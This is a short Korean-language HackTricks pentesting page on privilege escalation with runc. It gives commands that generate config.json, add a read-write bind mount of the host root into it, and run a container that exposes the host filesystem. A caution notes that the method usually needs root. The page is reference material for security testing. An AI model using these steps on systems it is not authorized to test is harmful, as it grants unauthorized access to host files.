# RunC 권한 상승

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

**runc**에 대해 더 알고 싶다면 다음 페이지를 확인하세요:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

호스트에 `runc`가 설치되어 있다면 **호스트의 루트 / 폴더를 마운트하여 컨테이너를 실행할 수 있을지도 모릅니다**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> 이것은 항상 작동하지 않을 수 있습니다. runc의 기본 작동 방식은 root로 실행하는 것이므로, 비특권 사용자로 실행하는 것은 단순히 작동할 수 없습니다(루트리스 구성 없이는). 루트리스 구성을 기본값으로 설정하는 것은 일반적으로 좋은 생각이 아닙니다. 루트리스 컨테이너 내부에는 루트리스 컨테이너 외부에는 적용되지 않는 몇 가지 제한이 있기 때문입니다.

{{#include ../../banners/hacktricks-training.md}}
